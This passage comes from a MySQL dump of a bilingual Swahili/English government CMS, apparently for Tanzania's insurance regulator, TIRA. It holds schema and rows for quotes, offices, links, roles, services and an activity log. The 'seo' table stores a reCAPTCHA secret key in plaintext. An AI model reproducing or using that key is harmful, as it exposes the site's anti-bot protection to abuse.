Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;</p>','<p>Changes in Second Stakeholders General Meeting&nbsp;&nbsp;Changes in Second Stakeholders General Meeting&nbsp;&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;</p>',1,1,'changes-in-second-stakeholders-general-meeting-3','2b72073b6f4749ccd7f2b6a26438a159','2022-01-02 02:58:21','2022-06-22 03:50:39'),(5,'Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec mollis consequat.','Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec mollis consequat.','',NULL,'<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec mollis consequat cursus. Nam id justo non turpis gravida dapibus. Cras a facilisis odio, quis accumsan diam. Sed sem neque, pharetra sit amet iaculis et, ullamcorper et risus. Morbi blandit nibh risus, et dignissim dui iaculis sit amet. In convallis lectus vitae tellus malesuada sodales. Sed iaculis aliquam magna at dictum. Aenean pharetra ligula massa, vel fermentum elit elementum pharetra. Integer et viverra purus. Donec molestie ante molestie fringilla scelerisque.</p>\r\n\r\n<p>Donec auctor, enim eleifend fermentum commodo, nisl eros malesuada lorem, eu suscipit ex est vitae lacus. Nullam euismod velit at velit mattis, vel mattis augue fringilla. Nam scelerisque eu quam varius gravida. Sed in ultrices justo, id tristique magna. Maecenas aliquet accumsan volutpat. Quisque commodo nisi at tortor rutrum consectetur. Nunc euismod, turpis ut rhoncus egestas, augue erat eleifend justo, nec vulputate sapien nisi non risus. Nullam eleifend placerat lorem, non vulputate tortor bibendum sed. Duis quis pharetra urna. Ut condimentum, ligula ut auctor malesuada, mi nulla efficitur velit, et eleifend neque mauris nec odio. Mauris a nunc felis. Cras quis leo dictum, rutrum nibh non, venenatis odio. Nam porttitor eros sed ipsum cursus, vitae pellentesque leo feugiat. Morbi magna leo, vehicula sed nisl eget, faucibus sollicitudin erat.</p>','<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec mollis consequat cursus. Nam id justo non turpis gravida dapibus. Cras a facilisis odio, quis accumsan diam. Sed sem neque, pharetra sit amet iaculis et, ullamcorper et risus. Morbi blandit nibh risus, et dignissim dui iaculis sit amet. In convallis lectus vitae tellus malesuada sodales. Sed iaculis aliquam magna at dictum. Aenean pharetra ligula massa, vel fermentum elit elementum pharetra. Integer et viverra purus. Donec molestie ante molestie fringilla scelerisque.</p>\r\n\r\n<p>Donec auctor, enim eleifend fermentum commodo, nisl eros malesuada lorem, eu suscipit ex est vitae lacus. Nullam euismod velit at velit mattis, vel mattis augue fringilla. Nam scelerisque eu quam varius gravida. Sed in ultrices justo, id tristique magna. Maecenas aliquet accumsan volutpat. Quisque commodo nisi at tortor rutrum consectetur. Nunc euismod, turpis ut rhoncus egestas, augue erat eleifend justo, nec vulputate sapien nisi non risus. Nullam eleifend placerat lorem, non vulputate tortor bibendum sed. Duis quis pharetra urna. Ut condimentum, ligula ut auctor malesuada, mi nulla efficitur velit, et eleifend neque mauris nec odio. Mauris a nunc felis. Cras quis leo dictum, rutrum nibh non, venenatis odio. Nam porttitor eros sed ipsum cursus, vitae pellentesque leo feugiat. Morbi magna leo, vehicula sed nisl eget, faucibus sollicitudin erat.</p>',1,1,'lorem-ipsum-dolor-sit-amet-consectetur-adipiscing-elit-donec-mollis-consequat','359e33e51fe1aa53a3cf522804567a50','2022-01-08 13:30:30','2022-06-22 03:51:31');
/*!40000 ALTER TABLE `quotes` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `regional_offices`
--

DROP TABLE IF EXISTS `regional_offices`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `regional_offices` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name_en` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `name_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `physical_address_sw` text COLLATE utf8mb4_unicode_ci,
  `physical_address_en` text COLLATE utf8mb4_unicode_ci,
  `phone` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `toll_free` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `fax` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `email` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `content_sw` text COLLATE utf8mb4_unicode_ci,
  `content_en` text COLLATE utf8mb4_unicode_ci,
  `photo_url` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `latitude` double DEFAULT NULL,
  `longitude` double DEFAULT NULL,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `headquarter` tinyint(1) NOT NULL DEFAULT '0',
  `used_as` smallint(6) NOT NULL DEFAULT '0',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `regional_offices`
--

LOCK TABLES `regional_offices` WRITE;
/*!40000 ALTER TABLE `regional_offices` DISABLE KEYS */;
INSERT INTO `regional_offices` VALUES (1,'HeadQuaters','HeadQuaters','S.L.P 2908,\r\nDododma, Tanzania','P.O.BOX 2908,\r\nDododma, Tanzania','+255-282 560666','255 222 15000','+255-282 560000','info@tira.go.tz',NULL,NULL,NULL,NULL,NULL,'tanzania-national-business-council',1,1,'2021-07-28 11:05:10','2022-08-07 11:33:58');
/*!40000 ALTER TABLE `regional_offices` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `related_links`
--

DROP TABLE IF EXISTS `related_links`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `related_links` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `link` tinyint(4) DEFAULT NULL,
  `url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `url_external` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `active` tinyint(1) NOT NULL DEFAULT '1',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `parent` int(11) NOT NULL DEFAULT '0',
  `position` int(11) NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=8 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `related_links`
--

LOCK TABLES `related_links` WRITE;
/*!40000 ALTER TABLE `related_links` DISABLE KEYS */;
INSERT INTO `related_links` VALUES (2,'Corporate Social Responsibility','Corporate Social Responsibility',1,'pages/corporate-social-responsibility',NULL,1,'2021-07-28 06:16:48','2022-08-10 05:18:48',0,1),(4,'Institutional Publications','Institutional Publications',1,'publications',NULL,1,'2021-07-28 06:17:43','2022-08-10 05:22:58',0,4),(5,'Media Center and Events','Media Center and Events',1,'galleries/listing/photos',NULL,1,'2021-07-28 06:18:04','2022-08-10 05:20:26',0,2),(7,'Reports','Reports',1,'publications/reports',NULL,1,'2022-06-22 13:43:29','2022-08-10 05:22:02',0,3);
/*!40000 ALTER TABLE `related_links` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `role_has_permissions`
--

DROP TABLE IF EXISTS `role_has_permissions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `role_has_permissions` (
  `permission_id` bigint(20) unsigned NOT NULL,
  `role_id` bigint(20) unsigned NOT NULL,
  PRIMARY KEY (`permission_id`,`role_id`),
  KEY `role_has_permissions_role_id_foreign` (`role_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `role_has_permissions`
--

LOCK TABLES `role_has_permissions` WRITE;
/*!40000 ALTER TABLE `role_has_permissions` DISABLE KEYS */;
INSERT INTO `role_has_permissions` VALUES (1,1),(1,2),(2,1),(3,1),(4,1),(5,1),(6,1),(7,1),(8,1),(9,1),(10,1),(11,1),(12,1),(13,1),(14,1),(15,1),(16,1),(17,1),(18,1),(19,1),(20,1),(21,1),(22,1),(23,1),(24,1),(25,1),(26,1),(27,1),(28,1),(29,1),(30,1),(31,1),(32,1),(33,1),(34,1),(35,1),(36,1),(37,1),(38,1),(39,1),(40,1),(41,1),(42,1),(43,1),(44,1),(45,1),(46,1),(47,1),(48,1),(49,1),(50,1),(51,1),(52,1),(53,1),(54,1),(55,1),(56,1),(57,1),(58,1),(59,1),(60,1),(61,1),(62,1),(63,1),(64,1),(65,1),(66,1),(67,1),(68,1),(69,1),(70,1),(71,1),(72,1),(73,1),(74,1),(75,1),(76,1),(77,1),(78,1),(79,1),(80,1),(81,1),(82,1),(83,1),(84,1),(85,1),(86,1),(87,1),(88,1),(89,1),(90,1),(91,1),(92,1),(93,1),(94,1),(95,1),(96,1),(97,1),(98,1),(99,1),(100,1),(101,1),(102,1),(103,1),(104,1),(105,1),(106,1),(107,1),(108,1),(109,1),(110,1),(111,1),(112,1),(113,1),(114,1),(115,1),(116,1),(117,1),(118,1),(119,1),(120,1),(121,1),(122,1),(123,1),(124,1),(125,1),(126,1),(127,1),(128,1),(129,1),(130,1),(131,1),(132,1),(133,1),(134,1),(135,1),(136,1),(137,1),(138,1),(139,1),(140,1),(141,1),(142,1),(143,1),(144,1),(145,1),(146,1),(147,1),(148,1),(149,1),(150,1),(151,1),(152,1),(153,1),(154,1),(155,1),(156,1),(157,1),(158,1),(159,1),(160,1),(161,1),(162,1),(163,1),(164,1),(165,1),(166,1),(167,1),(168,1),(169,1),(170,1),(171,1),(172,1),(173,1),(174,1),(175,1),(176,1),(177,1),(178,1),(179,1),(180,1),(181,1),(182,1),(183,1),(184,1),(185,1),(186,1),(187,1),(188,1),(189,1),(190,1),(191,1),(192,1),(193,1),(194,1),(195,1),(196,1),(197,1),(198,1),(199,1),(200,1),(201,1),(202,1),(203,1),(204,1),(205,1),(206,1),(207,1),(208,1),(209,1),(210,1),(211,1),(212,1),(213,1),(214,1),(215,1),(216,1),(217,1),(218,1),(219,1),(220,1),(221,1),(222,1),(223,1),(224,1),(225,1),(226,1),(227,1),(228,1),(229,1),(230,1),(231,1),(232,1),(233,1),(233,2),(234,1),(234,2),(235,1),(236,1),(237,1),(238,1),(239,1),(240,1),(241,1),(242,1),(243,1),(244,1),(245,1),(246,1),(247,1),(248,1),(249,1),(250,1),(251,1),(252,1),(253,1),(254,1),(255,1),(256,1),(257,1),(258,1),(259,1),(260,1),(261,1),(262,1),(263,1),(264,1),(265,1),(266,1),(267,1),(268,1),(269,1),(270,1),(271,1),(272,1),(273,1),(274,1),(275,1),(276,1),(277,1),(278,1),(279,1),(280,1),(281,1),(282,1),(283,1),(284,1),(285,1),(286,1),(287,1),(288,1),(289,1),(290,1),(291,1),(292,1),(293,1),(294,1),(295,1),(296,1),(297,1),(298,1),(299,1),(300,1),(301,1),(302,1),(303,1),(304,1),(305,1),(306,1),(307,1),(308,1),(309,1),(310,1),(311,1),(312,1),(313,1),(314,1),(315,1),(316,1),(317,1),(318,1),(319,1),(320,1),(321,1),(322,1),(323,1),(324,1),(325,1),(326,1),(327,1),(328,1),(329,1),(330,1),(331,1),(332,1),(333,1),(334,1),(335,1),(336,1),(337,1),(338,1),(339,1),(340,1),(341,1),(342,1),(343,1),(344,1),(345,1),(346,1),(347,1),(348,1),(349,1),(350,1),(351,1),(352,1),(353,1),(354,1),(355,1),(356,1),(357,1),(358,1),(359,1),(360,1),(361,1),(362,1),(363,1),(364,1),(365,1),(366,1),(367,1),(368,1),(369,1),(370,1),(371,1),(372,1),(373,1),(374,1),(375,1),(376,1),(377,1),(378,1),(379,1),(380,1),(381,1),(382,1),(383,1),(384,1),(385,1),(386,1),(387,1),(388,1),(389,1),(390,1),(391,1),(392,1),(393,1),(394,1),(395,1),(396,1),(397,1),(398,1),(399,1),(400,1),(401,1),(402,1);
/*!40000 ALTER TABLE `role_has_permissions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `roles`
--

DROP TABLE IF EXISTS `roles`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `roles` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `display_name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `description` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `guard_name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `roles`
--

LOCK TABLES `roles` WRITE;
/*!40000 ALTER TABLE `roles` DISABLE KEYS */;
INSERT INTO `roles` VALUES (1,'Administrator','Administrator','Administrator','web','2021-06-29 06:56:30','2021-06-29 06:56:30'),(2,'Default','Default User','Default Role','web','2020-06-14 04:30:23','2022-02-16 13:34:02');
/*!40000 ALTER TABLE `roles` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `seo`
--

DROP TABLE IF EXISTS `seo`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `seo` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `content_en` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `content_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `keywords_en` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `keywords_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `recaptcha_site_key` text COLLATE utf8mb4_unicode_ci,
  `recaptcha_secret_key` text COLLATE utf8mb4_unicode_ci,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `seo`
--

LOCK TABLES `seo` WRITE;
/*!40000 ALTER TABLE `seo` DISABLE KEYS */;
INSERT INTO `seo` VALUES (1,'Government Website','Tovuti ya Serikali','Government,website','Tovuti,serikali','2021-09-20 03:56:59','2021-09-20 03:56:59','6LdK9nIcAAAAAKCjCMNVoNtob9Shvmx7Xkj1qxHY','6LdK9nIcAAAAAD_MZovQUsH8YNeMtcrwXBX3YWWG');
/*!40000 ALTER TABLE `seo` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `services`
--

DROP TABLE IF EXISTS `services`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `services` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `summary_sw` text COLLATE utf8mb4_unicode_ci,
  `summary_en` text COLLATE utf8mb4_unicode_ci,
  `content_sw` text COLLATE utf8mb4_unicode_ci,
  `content_en` text COLLATE utf8mb4_unicode_ci,
  `photo_url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `featured` tinyint(1) NOT NULL DEFAULT '0',
  `active` tinyint(1) NOT NULL DEFAULT '1',
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `call_to_action_en` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'Go to Service Now',
  `call_to_action_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'Ingia Sasa',
  `url` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `user_id` int(11) NOT NULL,
  `icon` text COLLATE utf8mb4_unicode_ci,
  `color` text COLLATE utf8mb4_unicode_ci,
  `specials` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `services`
--

LOCK TABLES `services` WRITE;
/*!40000 ALTER TABLE `services` DISABLE KEYS */;
INSERT INTO `services` VALUES (3,'Tanzania Imports Insurance Portal','Tanzania Imports Insurance Portal',NULL,NULL,'<p>Tanzania Imports Insurance Portal</p>','<p>Tanzania Imports Insurance Portal</p>','a4e9a3a9a6d71c0a2440aab1d42e62ca.jpeg',0,1,'tanzania-insurance-portal','Go to Service Now','Ingia Sasa','http://tiip.tira.go.tz','2021-08-02 05:03:54','2022-08-12 07:14:06',0,'icon-1659878950',NULL,NULL),(4,'TIRA MIS Portal','TIRA MIS Portal',NULL,NULL,'<p>TIRA MIS Portal</p>','<p>TIRA MIS Portal</p>','d231741ce8c379e18948f846d176d7ec.jpeg',0,1,'tiramis-portal','Go to Service Now','Ingia Sasa','http://tiramis.tira.go.tz/','2021-08-02 05:05:24','2022-08-12 07:12:00',0,'icon-1659878879',NULL,NULL),(5,'TIRA RBS System Portal','TIRA RBS System Portal',NULL,NULL,'<p>TIRA RBS System Portal</p>','<p>TIRA RBS System Portal</p>','a4e9a3a9a6d71c0a2440aab1d42e62ca.jpeg',0,1,'tira-rbs-system-portal','Go to Service Now','Ingia Sasa','https://apps.tira.go.tz/TIRARBSPortal/','2021-09-11 09:24:32','2022-08-12 07:10:34',0,'icon-1659885934',NULL,NULL),(7,'Online Registration System(ORS)','Online Registration System(ORS)',NULL,NULL,'<p>Online Registration System enable clients to obtain license online</p>','<p>Online Registration System enable clients to obtain license online</p>','a4e9a3a9a6d71c0a2440aab1d42e62ca.jpeg',0,1,'rbss-informations','Go to Service Now','Ingia Sasa','https://ors.tira.go.tz','2022-03-07 08:01:23','2022-08-13 19:22:55',0,'icon-1659878969',NULL,NULL),(8,'Reinsurance Portal','Reinsurance Portal',NULL,NULL,'<p>Reinsurance Portal</p>','<p>Reinsurance Portal</p>','',0,1,'reinsurance-portal','Go to Service now','Ingia sasa','http://rp.tira.go.tz','2022-08-13 19:39:12','2022-08-13 19:39:12',0,'icon-1660430352',NULL,NULL),(9,'TSS Portal','TSS Portal',NULL,NULL,'<p>tss</p>','<p>tss</p>','',0,1,'tss-portal','Go to Service now','Ingia sasa','http://tss.tira.go.tz','2022-08-13 19:43:59','2022-08-13 19:43:59',0,'icon-1660430639',NULL,NULL);
/*!40000 ALTER TABLE `services` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `settings`
--

DROP TABLE IF EXISTS `settings`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `settings` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `content_sw` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `content_en` text COLLATE utf8mb4_unicode_ci,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `settings`
--

LOCK TABLES `settings` WRITE;
/*!40000 ALTER TABLE `settings` DISABLE KEYS */;
/*!40000 ALTER TABLE `settings` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `social_links`
--

DROP TABLE IF EXISTS `social_links`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `social_links` (
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `parent` int(11) NOT NULL DEFAULT '0',
  `position` int(11) NOT NULL DEFAULT '0',
  `active` int(11) NOT NULL DEFAULT '1',
  `id` int(11) NOT NULL AUTO_INCREMENT,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `social_links`
--

LOCK TABLES `social_links` WRITE;
/*!40000 ALTER TABLE `social_links` DISABLE KEYS */;
INSERT INTO `social_links` VALUES ('facebook','http://facebook.com','2021-07-28 05:47:02','2021-07-28 05:47:02',0,0,1,1),('instagram','http://instagram.com','2021-07-28 05:47:44','2021-07-28 05:47:44',0,0,1,2),('youtube','https://youtube.com','2021-07-28 05:49:31','2021-07-28 05:50:19',0,0,1,3),('twitter','http://twitter.com','2021-07-28 05:50:00','2021-07-28 05:50:00',0,0,1,4);
/*!40000 ALTER TABLE `social_links` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `special_pages`
--

DROP TABLE IF EXISTS `special_pages`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `special_pages` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `content_sw` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `content_en` text COLLATE utf8mb4_unicode_ci,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `special_pages`
--

LOCK TABLES `special_pages` WRITE;
/*!40000 ALTER TABLE `special_pages` DISABLE KEYS */;
/*!40000 ALTER TABLE `special_pages` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `speeches`
--

DROP TABLE IF EXISTS `speeches`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `speeches` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `name_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `content_sw` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `content_en` text COLLATE utf8mb4_unicode_ci,
  `file_en` varchar(150) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `file_sw` varchar(150) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `active` tinyint(1) NOT NULL DEFAULT '1',
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `user_id` int(11) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `speeches`
--

LOCK TABLES `speeches` WRITE;
/*!40000 ALTER TABLE `speeches` DISABLE KEYS */;
INSERT INTO `speeches` VALUES (1,'Demo','Demo','<p>Demo</p>','<p>Demo</p>','/uploads/speeches/en1631361370-DCEA_CHALLENGES.pdf','/uploads/speeches/sw1631361370-DCEA_CHALLENGES.pdf',1,'demo',1,'2021-09-11 08:56:10','2021-09-11 08:56:10');
/*!40000 ALTER TABLE `speeches` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `support_links`
--

DROP TABLE IF EXISTS `support_links`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `support_links` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `link` tinyint(1) NOT NULL DEFAULT '0',
  `url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `url_external` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `active` tinyint(1) NOT NULL DEFAULT '1',
  `parent` int(11) NOT NULL DEFAULT '0',
  `position` int(11) NOT NULL DEFAULT '1',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `support_links`
--

LOCK TABLES `support_links` WRITE;
/*!40000 ALTER TABLE `support_links` DISABLE KEYS */;
INSERT INTO `support_links` VALUES (1,'Circulars','Circulars',1,'publications/circular',NULL,1,0,1,'2022-02-22 10:18:00','2022-08-10 14:03:52'),(3,'Roles of Policy Holders','Roles of Policy Holders',1,'pages/roles-of-policy-holders',NULL,1,0,1,'2022-02-22 10:18:53','2022-08-10 14:08:00'),(4,'Licensing Requirements','Licensing Requirements',1,'publications/licensing-requirements',NULL,1,0,1,'2022-06-22 13:39:35','2022-08-10 14:09:28'),(5,'Frequently asked Questions','Frequently asked Questions',1,'faqs',NULL,1,0,1,'2022-06-22 13:39:54','2022-08-10 14:10:47');
/*!40000 ALTER TABLE `support_links` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `timelines`
--

DROP TABLE IF EXISTS `timelines`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `timelines` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `actor` int(11) NOT NULL,
  `object` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `verb` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `ip` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `content` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=1526 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `timelines`
--

LOCK TABLES `timelines` WRITE;
/*!40000 ALTER TABLE `timelines` DISABLE KEYS */;
INSERT INTO `timelines` VALUES (1511,1,'News','store','41.59.121.129','http://demo8.eganet.go.tz/tira/cms/news','{\"title_en\":\"RAIS MWINYI AILEKEZA TIRA KUTEKELEZA MABIDILIKO YA SHERIA YA FEDHA.\",\"title_sw\":\"RAIS MWINYI AILEKEZA TIRA KUTEKELEZA MABIDILIKO YA SHERIA YA FEDHA.\",\"content_en\":\"<p>1<\\/p>\",\"content_sw\":\"<p>1<\\/p>\",\"active\":\"1\",\"photo_url\":\"e3a5d8877d9b6c81528a698dfd31495d.jpeg\",\"user_id\":1,\"slug\":\"rais-mwinyi-ailekeza-tira-kutekeleza-mabidiliko-ya-sheria-ya-fedha\"}','2022-08-13 19:52:32','2022-08-13 19:52:32'),(1512,1,'Photo','store','41.59.121.129','http://demo8.eganet.go.tz/tira/cms/media','{\"gallery_id\":7,\"content_sw\":\"TIRA Ofice\",\"content_en\":\"TIRA Ofice\",\"status\":\"1\",\"path\":\"\\/uploads\\/gallery\\/\",\"filename\":\"b71f3828d0151f7272c217bc750ba6be.jpeg\",\"mime\":\"images\\/jpeg\",\"slug\":\"b71f3828d0151f7272c217bc750ba6be-jpeg\"}','2022-08-13 20:17:13','2022-08-13 20:17:13'),(1513,1,'Photo','store','41.59.121.129','http://demo8.eganet.go.tz/tira/cms/media','{\"gallery_id\":8,\"content_sw\":\"ANYONE CAN INVEST IN 